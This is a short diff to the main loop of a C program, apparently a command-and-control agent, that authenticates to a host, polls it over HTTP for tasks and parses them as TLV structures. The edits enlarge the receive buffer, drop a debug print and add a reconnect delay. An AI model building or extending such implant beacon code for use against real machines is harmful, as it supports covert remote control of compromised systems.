@@ -21,7 +21,7 @@ int main() {
   struct TLVBuild taskTLV;
   struct TLVBuild argsTLV;
 
-  char* tasksBuffer = malloc(1024);
+  char* tasksBuffer = malloc(5120);
 
   while (1) {  
     agent.connected = (bool)authenticate();
@@ -29,13 +29,10 @@ int main() {
     while (agent.connected) {
       printf("fetching commands..\n");
 
-      if (!httpGet(host, port, agent.report_uri, 1024, &httpBytesRead, tasksBuffer)) {
+      if (!httpGet(host, port, agent.report_uri, 5120, &httpBytesRead, tasksBuffer)) {
         agent.connected = false;
         break;
       }
-      tasksBuffer[httpBytesRead] = 0x00;
-
-      printf("%s", tasksBuffer);
 
       tasksTLV = tlvFromBuf(tasksBuffer, httpBytesRead);
 
@@ -59,6 +56,9 @@ int main() {
 
       Sleep(5000);
     }
+
+    // before trying to reconnect again
+    Sleep(5000);
   }
 
   free(tasksBuffer);
